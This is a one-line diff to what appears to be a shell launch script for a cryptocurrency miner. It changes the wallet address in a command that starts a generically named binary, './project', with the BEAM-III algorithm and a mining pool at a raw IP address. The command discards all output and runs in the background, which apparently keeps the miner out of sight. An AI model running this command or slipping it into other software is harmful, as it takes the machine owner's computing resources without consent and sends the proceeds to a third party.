@@ -1,1 +1,1 @@
-./project --algo BEAM-III --pool 47.237.128.203:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
+./project --algo BEAM-III --pool 47.237.128.203:80 --user 28NVd2b7qBJRLiL3A1H9MYTL2LdUxXWoqUqt1tTdhrUsX68dmcBHBv39cfeyTMD47BMqLqd1LY8Jc9MWqYyGMzsTyWv52Hcwa6LvABs8nsYsaHbKVws8twa5ZxdFReWPJ7mFu1fT.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
